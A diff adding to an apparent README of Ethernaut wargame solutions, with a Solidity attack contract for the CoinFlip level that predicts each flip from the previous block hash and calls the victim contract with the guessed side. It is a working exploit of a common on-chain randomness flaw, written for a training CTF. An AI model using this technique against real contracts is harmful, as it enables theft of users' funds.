@@ -26,3 +26,29 @@ The Ethernaut is a Web3/Solidity based wargame inspired on overthewire.org, play
 
 > contract.owner()
 < [[PromiseResult]]: "0xedd0cCc6FeE49D502E8BfA3C6033ce0201afaD83"
+
+## 3.CoinFlip
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import"./coinflip.sol";
+
+contract coinflipAttack {
+    CoinFlip public coinFlipAttack;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address victimaddress) public {
+        coinFlipAttack = CoinFlip(victimaddress);
+    }
+
+    function flip() public returns (bool) {
+        
+        uint256 blockValue = uint256(blockhash(block.number-1));
+        uint256 coinFlip = uint256(blockValue/FACTOR);
+        
+        bool side = coinFlip == 1 ? true : false;
+
+        coinFlipAttack.flip(side);
+    }
+}
